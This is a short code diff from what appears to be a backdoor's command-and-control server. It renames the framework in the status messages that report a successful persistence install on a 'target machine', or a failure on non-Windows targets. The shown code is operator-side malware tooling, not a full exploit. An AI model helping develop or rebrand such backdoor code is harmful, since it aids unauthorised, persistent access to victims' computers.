@@ -23,8 +23,8 @@ def persist_command(client_output, key: bytes) -> str:
     """Handle the result of a persistence installation command."""
     decrypted_client_message = decrypt_message(client_output, key).decode()
     if decrypted_client_message == "created":
-        log_activity("Oberon Framework backdoor installed successfully on target machine. Persistance is now active.", "info")
-        return colored("[+] Oberon Framework backdoor installed successfully on target machine. Persistance is now active", "green")
+        log_activity("Th3Executor backdoor installed successfully on target machine. Persistance is now active.", "info")
+        return colored("[+] Th3Executor backdoor installed successfully on target machine. Persistance is now active", "green")
     elif decrypted_client_message == "not_windows":
         log_activity("Target is not using a windows machine, persistance will not work.", "error")
         return colored("[-] Target is not using a windows machine, persistance will not work", "red")
